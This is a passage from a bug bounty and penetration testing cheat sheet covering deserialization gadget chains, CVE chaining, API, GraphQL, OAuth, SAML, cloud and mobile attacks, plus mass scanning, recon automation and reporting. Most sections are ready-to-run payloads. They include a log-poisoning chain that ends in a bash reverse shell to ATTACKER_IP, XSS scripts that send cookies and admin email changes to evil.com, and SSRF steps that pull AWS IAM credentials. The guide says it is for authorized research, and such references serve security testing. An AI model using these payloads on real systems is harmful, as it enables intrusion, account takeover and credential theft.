java -jar ysoserial.jar CommonsCollections6 'curl http://ATTACKER_IP' | base64 -w0
java -jar ysoserial.jar URLDNS 'http://INTERACTSH_URL'  # OOB detection

# Available gadget chains
CommonsCollections1-7  # Apache Commons
Spring1, Spring2       # Spring framework
Groovy1               # Groovy
JRMPClient            # RMI

# Detection — look for Java serialized objects
# Magic bytes: AC ED 00 05 (hex) = rO0AB (base64)
echo "rO0AB" | grep -c "rO0AB"  # base64 java serialization

# Burp — scan request bodies for serialized data
# Extension: Java Deserialization Scanner
```

### 10.2 PHP Object Injection

```php
// Vulnerable code pattern
$data = unserialize($_GET['data']);

// Craft malicious serialized object
// Find gadget chains in composer packages: phpggc
phpggc -l                                    # List available gadgets
phpggc Laravel/RCE1 system id               # Laravel RCE
phpggc Symfony/RCE4 exec 'curl ATTACKER'    # Symfony RCE

// Raw PHP serialization
O:8:"UserData":1:{s:4:"role";s:5:"admin";}
a:2:{s:4:"user";s:5:"admin";s:5:"token";s:10:"1234567890";}
```

### 10.3 .NET Deserialization

```bash
# ysoserial.net
ysoserial.exe -f BinaryFormatter -g ObjectDataProvider \
  -c "powershell -c whoami"

# ViewState deserialization (when key is known)
ysoserial.exe -p ViewState \
  -g TextFormattingRunProperties \
  -c "powershell -c whoami" \
  --path="/page.aspx" \
  --apppath="/" \
  --decryptionalg="AES" \
  --decryptionkey="FOUND_KEY" \
  --validationalg="SHA1" \
  --validationkey="FOUND_KEY"

# Find MachineKey in web.config
# <machineKey decryptionKey="..." validationKey="..."/>
```

---

## 11. CVE CHAINING TACTICS

### 11.1 Chain: SSRF → AWS Metadata → Cloud Takeover

```bash
# Step 1: Find SSRF
GET /api/fetch?url=http://INTERACTSH_URL → OOB callback received

# Step 2: Read AWS metadata
GET /api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Step 3: Get IAM role name → get credentials
GET /api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME

# Response:
{
  "AccessKeyId": "ASIAXXXXXXXXXXXXXXXX",
  "SecretAccessKey": "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
  "Token": "xxxxxxxx..."
}

# Step 4: Use credentials
export AWS_ACCESS_KEY_ID=ASIAXXXXXXXXXX
export AWS_SECRET_ACCESS_KEY=xxxxxxxxxxxxxxxx
export AWS_SESSION_TOKEN=xxxxxxxxxxxxxxxx

aws sts get-caller-identity
aws s3 ls
aws ec2 describe-instances
```

### 11.2 Chain: XSS → CSRF → Admin Takeover

```javascript
// Stored XSS payload — runs when admin views page
<script>
fetch('/admin/api/users', {credentials:'include'})
.then(r=>r.json())
.then(data => {
  // Extract CSRF token
  fetch('/admin/api/change-email', {
    method: 'POST',
    credentials: 'include',
    headers: {'Content-Type':'application/json', 'X-CSRF-Token': data.csrf},
    body: JSON.stringify({email:'attacker@evil.com'})
  })
})
</script>
```

### 11.3 Chain: LFI → Log Poisoning → RCE

```bash
# Step 1: Confirm LFI
curl "https://target.com/page?file=../../../etc/passwd"

# Step 2: Poison Apache access log
curl -A "<?php system(\$_GET['cmd']); ?>" https://target.com/

# Step 3: Include poisoned log + execute
curl "https://target.com/page?file=../../../var/log/apache2/access.log&cmd=id"

# Step 4: Get reverse shell
curl "https://target.com/page?file=../../../var/log/apache2/access.log&\
cmd=bash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261"
```

### 11.4 Chain: Open Redirect → OAuth Token Theft

```
1. Find open redirect on OAuth client domain:
   https://client.com/redirect?url=https://evil.com

2. Craft malicious OAuth authorization URL:
   https://accounts.target.com/oauth/authorize
     ?client_id=LEGIT_CLIENT_ID
     &redirect_uri=https://client.com/redirect?url=https://evil.com
     &response_type=token
     &scope=read

3. Victim clicks → OAuth server sends token to redirect_uri
   → client.com redirects to evil.com
   → Token in URL fragment: https://evil.com/#access_token=STOLEN_TOKEN

4. Capture token on evil.com server
   → Full account access
```

### 11.5 Chain: Subdomain Takeover → Cookie Theft

```bash
# Step 1: Find dangling CNAME
curl -s "https://dangling-sub.target.com"  # Returns NXDOMAIN or provider error

# Common dangling providers
# AWS S3, GitHub Pages, Heroku, Azure, Netlify, Fastly

# Step 2: Claim subdomain on provider
# Register same bucket/repo name → subdomain now points to you

# Step 3: Host malicious page
# Cookie scope: .target.com covers sub.target.com
<script>
  document.location='https://evil.com/?c='+document.cookie
</script>

# Step 4: Steal session cookies → account takeover
# Report: Subdomain Takeover + Cookie Theft = Critical
```

---

## 12. API SECURITY TESTING

### 12.1 REST API Testing

```bash
# Endpoint discovery
# Common paths: /api/v1/, /api/v2/, /rest/, /graphql, /swagger
ffuf -u https://target.com/api/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt

# Swagger/OpenAPI spec discovery
curl https://target.com/api/swagger.json
curl https://target.com/api/openapi.yaml
curl https://target.com/swagger-ui.html

# HTTP method tampering
GET /api/admin/users     → 403
POST /api/admin/users    → 200!

# Version downgrade
/api/v2/user/1 → secured
/api/v1/user/1 → vulnerable (older version)

# JWT testing
# Decode
echo "eyJ..." | cut -d'.' -f2 | base64 -d

# Crack weak JWT secret
hashcat -a 0 -m 16500 token.jwt /usr/share/wordlists/rockyou.txt

# alg:none attack
# Change header to {"alg":"none","typ":"JWT"}
# Remove signature portion

# Tool: jwt_tool
python3 jwt_tool.py TOKEN -M at
python3 jwt_tool.py TOKEN -T  # tamper
python3 jwt_tool.py TOKEN -C -d wordlist.txt  # crack
```

### 12.2 API Rate Limit Bypass

```bash
# Change IP via headers
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
CF-Connecting-IP: 127.0.0.1

# Add null byte
POST /api/login\0
POST /api/login%00

# Add path variation
/api/login
/api//login
/api/./login

# HTTP version change
HTTP/1.1 → HTTP/2
```

---

## 13. GRAPHQL ATTACKS

```bash
# Find GraphQL endpoint
/graphql  /api/graphql  /v1/graphql  /query  /gql

# Introspection query — dump entire schema
{
  __schema {
    types {
      name
      fields {
        name
        type { name }
      }
    }
  }
}

# If introspection disabled → Clairvoyance
clairvoyance https://target.com/graphql -o schema.json

# Graphw00f — fingerprint engine
graphw00f -f -t https://target.com/graphql

# GraphQL injection
{
  user(id: "1 UNION SELECT 1,2,3--") {
    id
    name
  }
}

# IDOR via GraphQL
query {
  user(id: 1002) {          # ← change victim's ID
    email
    privateData
  }
}

# Batch query attack (bypass rate limit)
[
  {"query": "mutation { login(user:\"admin\", pass:\"pass1\") }"},
  {"query": "mutation { login(user:\"admin\", pass:\"pass2\") }"},
  ...x1000
]

# Graphql-cop — automated security audit
python3 -m graphql_cop -t https://target.com/graphql
```

---

## 14. OAUTH & AUTHENTICATION ATTACKS

### 14.1 OAuth Misconfigurations

```
1. redirect_uri bypass
   - https://target.com.evil.com
   - https://evil.com?@target.com
   - https://target.com/../../../evil.com
   - https://target.com/callback/../redirect?to=https://evil.com

2. state parameter missing → CSRF on OAuth flow

3. response_type=token → access token in URL → Referer leak

4. Implicit flow abuse → token in fragment accessible via JS

5. Authorization code reuse → code_challenge bypass

6. token_hint in logout endpoint → token leak

7. scope escalation
   → Authorize with read scope
   → Upgrade token: scope=read+admin
```

### 14.2 SAML Attacks

```xml
<!-- XXE in SAML -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<samlp:AuthnRequest>&xxe;</samlp:AuthnRequest>

<!-- Signature wrapping attack -->
<!-- Move signed assertion, inject unsigned malicious assertion -->

<!-- XML comment injection -->
<!-- admin<!---->.corp.com → admin.corp.com in XML -->
<NameID>attacker<!---->.corp.com@target.com</NameID>
```

---

## 15. CLOUD SECURITY ATTACKS

### 15.1 AWS Misconfigurations

```bash
# S3 bucket testing
# Find buckets
grayhatwarfare.com
curl -I https://target-backups.s3.amazonaws.com

# Access public bucket
aws s3 ls s3://target-backups --no-sign-request
aws s3 cp s3://target-backups/secrets.txt . --no-sign-request

# Credential takeover
aws sts get-caller-identity
aws iam list-users
aws iam list-roles
aws secretsmanager list-secrets
aws s3 ls

# Lambda function enumeration
aws lambda list-functions
aws lambda get-function --function-name FUNCTION_NAME

# EC2 metadata (via SSRF)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# AWS IMDSv2 (token-based)
TOKEN=$(curl -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" \
  http://169.254.169.254/latest/api/token)
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/
```

### 15.2 GCP Misconfigurations

```bash
# GCP metadata (via SSRF)
curl "http://metadata.google.internal/computeMetadata/v1/" \
  -H "Metadata-Flavor: Google"

# Get access token
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
  -H "Metadata-Flavor: Google"

# Storage bucket testing
gsutil ls gs://target-bucket
gsutil cat gs://target-bucket/credentials.json
```

---

## 16. MOBILE APP RECON

### 16.1 Android APK Analysis

```bash
# Decompile APK
apktool d app.apk -o decompiled/
jadx -d jadx_out/ app.apk

# Find hardcoded secrets
grep -rn "api_key\|api_secret\|password\|token\|endpoint\|http://" decompiled/
grep -rn "AWS\|firebase\|google" decompiled/

# Extract strings
strings app.apk | grep -E "(http|https|api|key|secret|token)"

# Analyze network traffic (Frida + Burp)
frida -U -l bypass-ssl-pinning.js com.target.app

# Find exposed activities
cat decompiled/AndroidManifest.xml | grep "exported=\"true\""

# MobSF — automated analysis
docker run -it -p 8000:8000 opensecurity/mobile-security-framework-mobsf
# Upload APK → full automated analysis
```

### 16.2 iOS App Analysis

```bash
# Decrypt IPA (jailbroken device)
frida-ios-dump -u root -p alpine -H DEVICE_IP com.target.app

# Class dump
class-dump-z app.decrypted -H -o headers/

# Find secrets
strings app.decrypted | grep -iE "(key|token|secret|password|api)"

# SSL pinning bypass
# Frida script: ssl-kill-switch
frida -U -l ssl-kill-switch.js -f com.target.app
```

---

## 17. SHODAN + CENSYS MASS SCANNING

### 17.1 Shodan Queries for CVEs

```bash
# Setup
shodan init YOUR_API_KEY
pip3 install shodan --break-system-packages

# CVE-specific queries
shodan search 'product:"Apache httpd" version:"2.4.49"'  # CVE-2021-41773
shodan search 'product:"Spring" http.title:"Whitelabel"' # Spring4Shell
shodan search 'product:"Log4j"'
shodan search 'X-Powered-By: Spring-Boot'
shodan search 'product:"Confluence"'                     # Atlassian
shodan search 'product:"Exchange"'                       # ProxyLogon
shodan search '"BIG-IP" port:443'                        # F5 CVE-2022-1388
shodan search 'product:"vCenter"'                        # VMware

# Organization-specific
shodan search 'org:"Target Corp" port:8080'
shodan search 'ssl:"target.com"'
shodan search 'http.title:"Target Corp" country:PH'

# Extract IPs
shodan search --fields ip_str,port 'product:"Apache httpd" version:"2.4.49"' \
  | awk '{print $1":"$2}' > shodan_targets.txt

# Cross-reference with bug bounty scope
grep -F -f inscope.txt shodan_targets.txt > in_scope.txt
```

### 17.2 Censys Queries

```bash
# Login: search.censys.io
# REST API
curl "https://search.censys.io/api/v2/hosts/search" \
  -u "API_ID:API_SECRET" \
  -H 'Content-Type: application/json' \
  -d '{"q":"services.software.product: \"Apache\" and services.software.version: \"2.4.49\""}'

# Useful queries
services.http.response.headers.server: "Apache/2.4.49"
services.tls.certificates.leaf.subject.common_name: "*.target.com"
autonomous_system.name: "Target Corp"
```

---

## 18. NUCLEI CUSTOM TEMPLATES

### 18.1 Template Structure

```yaml
id: custom-vuln-check

info:
  name: Custom Vulnerability Check
  author: youralias
  severity: high        # info, low, medium, high, critical
  tags: custom,cve,rce
  reference:
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-XXXX

http:
  - method: GET
    path:
      - "{{BaseURL}}/.env"
      - "{{BaseURL}}/.env.backup"
      - "{{BaseURL}}/.env.production"

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "DB_PASSWORD"
          - "APP_KEY"
          - "AWS_SECRET"
        condition: or

      - type: status
        status:
          - 200

    extractors:
      - type: regex
        name: env_keys
        regex:
          - '[A-Z_]+=.+'
```

### 18.2 Advanced Template — OOB Detection

```yaml
id: ssrf-oob-check

info:
  name: SSRF OOB Detection
  severity: high

http:
  - method: GET
    path:
      - "{{BaseURL}}/api/fetch?url=http://{{interactsh-url}}"
      - "{{BaseURL}}/proxy?target=http://{{interactsh-url}}"
      - "{{BaseURL}}/redirect?url=http://{{interactsh-url}}"

    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"
          - "dns"
        condition: or
```

### 18.3 Mass CVE Scanning

```bash
# Update nuclei templates
nuclei -update-templates

# Mass scan with CVE tags
nuclei -l live_hosts.txt \
  -t cves/ \
  -severity critical,high \
  -rate-limit 100 \
  -bulk-size 50 \
  -o nuclei_cves.txt \
  -stats

# Specific year CVEs
nuclei -l live_hosts.txt \
  -tags cve2024,cve2023 \
  -o recent_cves.txt

# Custom template scan
nuclei -l live_hosts.txt \
  -t my_templates/ \
  -o custom_results.txt
```

---

## 19. FULL AUTOMATION PIPELINE

### 19.1 Complete Recon Script

```bash
#!/bin/bash
# fullrecon.sh — Complete Bug Bounty Automation

TARGET=$1
OUTPUT="./bounty/$TARGET"
DATE=$(date +%Y%m%d)
mkdir -p $OUTPUT/{subs,urls,js,screenshots,vulns}

echo "═══════════════════════════════════════"
echo " FULL RECON: $TARGET"
echo "═══════════════════════════════════════"

# Phase 1: Subdomain Enumeration
echo "[1/8] Subdomain Enumeration..."
subfinder -d $TARGET -silent | anew $OUTPUT/subs/passive.txt
amass enum -passive -d $TARGET 2>/dev/null | anew $OUTPUT/subs/passive.txt
curl -s "https://crt.sh/?q=%25.$TARGET&output=json" 2>/dev/null | \
  jq -r '.[].name_value' 2>/dev/null | \
  sed 's/\*\.//g' | sort -u | anew $OUTPUT/subs/passive.txt

# Phase 2: DNS Brute-Force
echo "[2/8] DNS Brute-Force..."
puredns bruteforce /opt/wordlists/dns/best-dns-wordlist.txt \
  $TARGET -r /opt/resolvers/resolvers.txt 2>/dev/null | \
  anew $OUTPUT/subs/brute.txt

cat $OUTPUT/subs/passive.txt $OUTPUT/subs/brute.txt | \
  sort -u > $OUTPUT/subs/all_subs.txt

# Phase 3: Probe Live Hosts
echo "[3/8] Probing live hosts..."
cat $OUTPUT/subs/all_subs.txt | \
  httpx -silent -title -status-code -tech-detect \
  -ports 80,443,8080,8443,3000,5000,8000,9000 \
  -o $OUTPUT/live_hosts.txt

cat $OUTPUT/live_hosts.txt | awk '{print $1}' > $OUTPUT/live_urls.txt

# Phase 4: Screenshot
echo "[4/8] Taking screenshots..."
gowitness file -f $OUTPUT/live_urls.txt \
  --screenshot-path $OUTPUT/screenshots/ 2>/dev/null

# Phase 5: URL Collection
echo "[5/8] Collecting URLs..."
cat $OUTPUT/live_urls.txt | gau --threads 5 2>/dev/null | \
  anew $OUTPUT/urls/gau.txt

cat $OUTPUT/live_urls.txt | \
  xargs -I{} katana -u {} -depth 3 -jc -silent 2>/dev/null | \
  anew $OUTPUT/urls/katana.txt

cat $OUTPUT/urls/*.txt | uro | sort -u > $OUTPUT/urls/all_urls.txt

# Phase 6: JS Analysis
echo "[6/8] JS Recon..."
cat $OUTPUT/urls/all_urls.txt | grep "\.js$" | \
  anew $OUTPUT/js/js_files.txt

cat $OUTPUT/js/js_files.txt | \
  xargs -I{} bash -c \
  'curl -sk {} | grep -Eo "(api_key|token|secret)[=:][a-zA-Z0-9_-]{8,}" 2>/dev/null' | \
  sort -u > $OUTPUT/js/secrets.txt

# Phase 7: Vulnerability Scanning
echo "[7/8] Vulnerability Scanning..."
nuclei -l $OUTPUT/live_urls.txt \
  -t /opt/nuclei-templates/ \
  -severity medium,high,critical \
  -rate-limit 50 \
  -o $OUTPUT/vulns/nuclei.txt \
  -silent 2>/dev/null

# Phase 8: Parameter Discovery
echo "[8/8] Parameter Discovery..."
cat $OUTPUT/urls/all_urls.txt | grep "?" | \
  qsreplace FUZZ | \
  head -100 | \
  ffuf -u FUZZ -w - \
  -mc 200 -fs 0 \
  -o $OUTPUT/vulns/params.json -of json \
  -silent 2>/dev/null

echo ""
echo "═══════════════════════════════════════"
echo " DONE! Results in: $OUTPUT/"
echo " Subdomains: $(wc -l < $OUTPUT/subs/all_subs.txt)"
echo " Live hosts: $(wc -l < $OUTPUT/live_urls.txt)"
echo " URLs found: $(wc -l < $OUTPUT/urls/all_urls.txt)"
echo "═══════════════════════════════════════"
```

---

## 20. CVE MONITORING AUTOMATION

### 20.1 Daily CVE Alert Script

```bash
#!/bin/bash
# cve_monitor.sh — Daily CVE alert for your tech stack

SLACK_WEBHOOK="https://hooks.slack.com/services/YOUR/WEBHOOK/URL"
TECHNOLOGIES=("wordpress" "apache" "nginx" "spring" "log4j" "php" \
               "confluence" "jira" "exchange" "vcenter" "gitlab")
YESTERDAY=$(date -d '1 day ago' +%Y-%m-%dT00:00:00.000)
TODAY=$(date +%Y-%m-%dT23:59:59.999)

for tech in "${TECHNOLOGIES[@]}"; do
  RESULTS=$(curl -s \
    "https://services.nvd.nist.gov/rest/json/cves/2.0?\
keywordSearch=$tech&pubStartDate=$YESTERDAY&pubEndDate=$TODAY&cvssV3Severity=HIGH" | \
    jq -r '.vulnerabilities[]?.cve | "\(.id) [CVSS:\(.metrics.cvssMetricV31[0].cvssData.baseScore // "N/A")] \(.descriptions[0].value[:100])"' \
    2>/dev/null)

  if [ -n "$RESULTS" ]; then
    MESSAGE="🚨 *New HIGH/CRITICAL CVEs for: $tech*\n\`\`\`\n$RESULTS\n\`\`\`"
    curl -s -X POST "$SLACK_WEBHOOK" \
      -H 'Content-type: application/json' \
      --data "{\"text\":\"$MESSAGE\"}" > /dev/null
  fi
done

echo "CVE monitor run complete: $(date)"
```

### 20.2 GitHub CVE PoC Watcher

```bash
#!/bin/bash
# Watch for new PoC repos
CVE_LIST=("CVE-2024-" "CVE-2025-")
GITHUB_TOKEN="YOUR_GITHUB_TOKEN"

for cve in "${CVE_LIST[@]}"; do
  curl -s -H "Authorization: token $GITHUB_TOKEN" \
    "https://api.github.com/search/repositories?\
q=$cve&sort=updated&order=desc&per_page=5" | \
    jq -r '.items[] | "\(.full_name) - \(.description) [\(.updated_at)]"'
done
```

---

## 21. PATCH DIFFING TECHNIQUES

### 21.1 Source Code Diff

```bash
# Clone vulnerable + patched version
git clone https://github.com/target/app
cd app

# Find security-related commits
git log --oneline --all | grep -i \
  "security\|fix\|patch\|vuln\|CVE\|auth\|bypass\|injection"

# Diff two versions
git diff v1.0.0 v1.0.1 -- src/

# Diff specific files
git diff COMMIT_HASH1 COMMIT_HASH2 -- app/auth/login.php

# Full patch view
git show COMMIT_HASH --stat
git show COMMIT_HASH -p
```

### 21.2 Reading Patch Diffs

```diff
# Example: Finding Authentication Bypass from Patch

# PHP Type Juggling
- if ($token == $expected_token) {    ← VULNERABLE (loose ==)
+ if ($token === $expected_token) {   ← PATCHED (strict ===)
# Attack: token=0 → "0" == "anystring" = FALSE... unless anystring is "0e..."

# Mass Assignment Fix
- $user->update($request->all());     ← VULNERABLE (all fields)
+ $user->update($request->only(['name','email']));  ← PATCHED (whitelist)

# SQLi Fix
- $query = "SELECT * FROM users WHERE id = " . $_GET['id'];  ← VULNERABLE
+ $stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?"); ← PATCHED

# Understand the pattern → find similar unpatched code in same codebase!
```

### 21.3 Binary Diff (Closed Source)

```bash
# Bindiff — IDA Pro plugin for binary comparison
# 1. Disassemble both versions in IDA Pro
# 2. Export .BinExport files
# 3. Compare with BinDiff

# Ghidra (free alternative)
# 1. Import both binaries
# 2. Use Version Tracking feature
# 3. Find changed functions → investigate

# Radare2 diff
radiff2 old_binary new_binary
radiff2 -AA old_binary new_binary  # deep analysis
```

---

## 22. REPORTING & POC METHODS

### 22.1 Report Structure (HackerOne/Bugcrowd)

```markdown
## Summary
Brief description of the vulnerability and its impact.

## Vulnerability Details
- **Type**: [SQL Injection / XSS / SSRF / etc.]
- **Component**: [Affected endpoint/parameter]
- **Severity**: [Critical/High/Medium/Low]
- **CVSS Score**: [9.8] — [Vector String]

## Steps to Reproduce
1. Login to https://target.com
2. Navigate to /api/v1/search
3. Send the following request:
   [Paste full HTTP request]
4. Observe the response contains...

## Proof of Concept
[HTTP Request]
[HTTP Response]
[Screenshot/Video]

## Impact
Describe what an attacker can do:
- Access sensitive data
- Execute arbitrary commands
- Take over accounts

## Recommended Fix
[Specific remediation advice]
```

### 22.2 Safe PoC Commands (Never Destructive)

```bash
# SAFE — always use these for PoC
id                                    # Prove code execution
whoami
hostname
cat /etc/hostname
sleep 5                               # Blind detection
curl http://INTERACTSH_URL           # OOB callback
nslookup INTERACTSH_URL              # DNS callback

# NEVER USE IN PoC
rm -rf                               # Destructive
DROP TABLE                           # Destructive
useradd attacker                     # Persistent change
chmod 777 /etc/passwd                # Dangerous
Exfiltrate real user PII             # Privacy violation
```

### 22.3 CVSS Score Calculation

```
Attack Vector (AV):     Network(N) > Adjacent(A) > Local(L) > Physical(P)
Attack Complexity (AC): Low(L) > High(H)
Privileges Required (PR): None(N) > Low(L) > High(H)
User Interaction (UI):  None(N) > Required(R)
Scope (S):              Changed(C) > Unchanged(U)
Confidentiality (C):    High(H) > Low(L) > None(N)
Integrity (I):          High(H) > Low(L) > None(N)
Availability (A):       High(H) > Low(L) > None(N)

# Calculate: https://www.first.org/cvss/calculator/3.1
```

---

## 23. BUG BOUNTY PLATFORMS & RESOURCES

### Platforms

| Platform        | URL               | Notes                    |
| --------------- | ----------------- | ------------------------ |
| HackerOne       | hackerone.com     | Largest platform         |
| Bugcrowd        | bugcrowd.com      | Enterprise focused       |
| Intigriti       | intigriti.com     | European programs        |
| Synack          | synack.com        | Invite-only, highest pay |
| YesWeHack       | yeswehack.com     | French platform          |
| Federacy        | federacy.com      | Startups                 |
| Open Bug Bounty | openbugbounty.org | Free, no bounties        |

### Learning Resources

| Resource             | URL                                    |
| -------------------- | -------------------------------------- |
| PortSwigger Academy  | portswigger.net/web-security           |
| HackTheBox           | hackthebox.com                         |
| TryHackMe            | tryhackme.com                          |
| PentesterLab         | pentesterlab.com                       |
| Vulhub Labs          | github.com/vulhub/vulhub               |
| HackerOne Hacktivity | hackerone.com/hacktivity               |
| Bug Bounty Reports   | github.com/reddelexc/hackerone-reports |
| NahamSec YT          | youtube.com/@NahamSec                  |
| STÖK YT             | youtube.com/@STOKfredrik               |

---

## 24. TOOL ARSENAL — COMPLETE LIST

### Installation (Go tools)

```bash
go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
go install github.com/projectdiscovery/httpx/cmd/httpx@latest
go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
go install github.com/projectdiscovery/katana/cmd/katana@latest
go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
go install github.com/projectdiscovery/naabu/v2/cmd/naabu@latest
go install github.com/projectdiscovery/dnsx/cmd/dnsx@latest
go install github.com/projectdiscovery/mapcidr/cmd/mapcidr@latest
go install github.com/lc/gau/v2/cmd/gau@latest
go install github.com/tomnomnom/anew@latest
go install github.com/tomnomnom/waybackurls@latest
go install github.com/tomnomnom/qsreplace@latest
go install github.com/tomnomnom/unfurl@latest
go install github.com/hakluke/hakrawler@latest
go install github.com/ffuf/ffuf/v2@latest
go install github.com/s0md3v/dalfox@latest
go install github.com/assetnote/kiterunner/cmd/kr@latest
go install github.com/rverton/webanalyze/cmd/webanalyze@latest
go install github.com/OJ/gobuster/v3@latest
go install github.com/sensepost/gowitness@latest
```

### Installation (Python tools)

```bash
pip3 install arjun --break-system-packages
pip3 install trufflehog --break-system-packages
pip3 install wpscan --break-system-packages
pip3 install graphql-cop --break-system-packages
pip3 install shodan --break-system-packages
pip3 install clairvoyance --break-system-packages
```

### Tool Quick Reference Table

| Tool       | Purpose                | Command                                        |
| ---------- | ---------------------- | ---------------------------------------------- |
| subfinder  | Passive subdomain enum | `subfinder -d target.com`                    |
| amass      | Comprehensive recon    | `amass enum -passive -d target.com`          |
| httpx      | Probe live hosts       | `cat subs.txt \| httpx -silent`               |
| naabu      | Port scanning          | `naabu -host target.com -top-ports 1000`     |
| dnsx       | DNS resolution         | `dnsx -l subs.txt -a -cname`                 |
| nuclei     | Vuln scanning          | `nuclei -u target.com -t cves/`              |
| ffuf       | Fuzzing                | `ffuf -u URL/FUZZ -w wordlist.txt`           |
| katana     | Web crawling           | `katana -u target.com -jc`                   |
| gau        | URL archiving          | `gau target.com`                             |
| dalfox     | XSS scanner            | `dalfox url "https://target.com?q=x"`        |
| sqlmap     | SQLi scanner           | `sqlmap -u "https://target.com?id=1"`        |
| nikto      | Web scanner            | `nikto -h https://target.com`                |
| arjun      | Param discovery        | `arjun -u https://target.com/api`            |
| wpscan     | WordPress CVEs         | `wpscan --url target.com --api-token TOKEN`  |
| interactsh | OOB detection          | `interactsh-client -v`                       |
| gitleaks   | Secret scanner         | `gitleaks detect --source .`                 |
| trufflehog | Secret scanner         | `trufflehog github --org=targetorg`          |
| gowitness  | Screenshots            | `gowitness file -f urls.txt`                 |
| puredns    | DNS brute-force        | `puredns bruteforce wordlist.txt target.com` |
| anew       | Deduplicate            | `cat new.txt \| anew existing.txt`            |
| ysoserial  | Java deser             | `java -jar ysoserial.jar CB1 cmd`            |
| phpggc     | PHP deser              | `phpggc Laravel/RCE1 system id`              |
| jwt_tool   | JWT attacks            | `python3 jwt_tool.py TOKEN -M at`            |
| kiterunner | API routes             | `kr scan https://target.com/api/`            |

---

## ⚠️ LEGAL & ETHICAL REMINDERS

```
✅ ALWAYS:
  → Read and follow the program's scope carefully
  → Get written authorization before testing
  → Use safe, non-destructive PoC payloads
  → Report vulnerabilities responsibly
  → Respect data privacy — don't exfiltrate real PII
  → Follow coordinated disclosure timelines

❌ NEVER:
  → Test out-of-scope assets
  → Run DoS/DDoS attacks
  → Delete, modify, or destroy data
  → Access production data beyond minimal PoC
  → Publicly disclose before vendor patches
  → Use automated scanners without permission
```

---

*Last Updated: 2025 | For authorized security research and bug bounty programs only.*
